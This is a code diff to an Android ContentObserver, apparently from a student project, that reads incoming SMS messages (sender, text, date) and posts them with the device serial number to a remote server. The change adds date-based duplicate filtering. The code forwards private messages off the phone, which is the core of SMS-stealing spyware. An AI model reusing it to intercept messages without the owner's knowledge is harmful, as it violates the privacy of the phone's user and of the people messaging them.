@@ -1,11 +1,13 @@
 package com.example.natalia.super_inzynierka;
 
+import android.app.Application;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.widget.Toast;
 import com.loopj.android.http.AsyncHttpResponseHandler;
 import com.loopj.android.http.RequestParams;
 import cz.msebera.android.httpclient.Header;
@@ -25,11 +27,11 @@ public class MyObserver extends ContentObserver {
     public static int index = 0;
     public static String serialNr = LocationTrace.serialNr;
     String lastSMS = "";
+    long lastDate = 0;
     String smsText;
     String smsNumber;
     Cursor cursor;
-    String text = "";
-    String nr = "";
+    int post = 0;
 
     public MyObserver(Handler handler) {
         super(handler);
@@ -85,8 +87,8 @@ public class MyObserver extends ContentObserver {
                     if (mDay < 10) day = "0" + mDay;
                     String time = day + "-" + month + "-" + mYear + "  " + hour + ":" + min;
 
-
-                if(smsChecker( "Number " + smsNumber + ": " + smsText)) {
+                post = 0;
+                if(smsChecker( "Number " + smsNumber + ": " + smsText, smsDate)) {
                     //save data into database/sd card here
                     postRequest(smsNumber, time, smsText, serialNr);
 
@@ -104,24 +106,35 @@ public class MyObserver extends ContentObserver {
         }
     }
 
-    public boolean smsChecker(String sms) {
+    private Context context;
+
+    public boolean smsChecker(String sms, String date) {
+        Long dateLong = Long.parseLong(date);
         System.out.println("CHECKER");
         boolean flagSMS = true;
-        System.out.println(sms);
-        System.out.println(lastSMS);
+        System.out.println(sms + dateLong);
+        System.out.println(lastSMS + lastDate);
+
+//        Toast.makeText(context, "1 " + sms+dateLong, Toast.LENGTH_LONG).show();
+//        Toast.makeText(context, "2 " + lastSMS+lastDate, Toast.LENGTH_LONG).show();
 
 
-        if (sms.equals(lastSMS)) {
+        if (sms.equals(lastSMS) || dateLong < lastDate) {
+            System.out.println("flaga false ");
             flagSMS = false;
         }
         else {
+            System.out.println("ELSE");
             lastSMS = sms;
+            lastDate = dateLong;
         }
+        System.out.println("RETURN");
         return flagSMS;
     }
 
     public boolean postRequest(final String number, final String date, final String text, final String serialNumber) {
 
+        post = 1;
         RequestParams params = new RequestParams();
         params.put("number", number);
         params.put("start_time", date);
@@ -153,6 +166,7 @@ public class MyObserver extends ContentObserver {
             public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                 System.out.println("ON FAILURE SMS");
                 network = false;
+
                 listAddress.add(index, number);
                 listTime.add(index, date);
                 listBody.add(index, text);
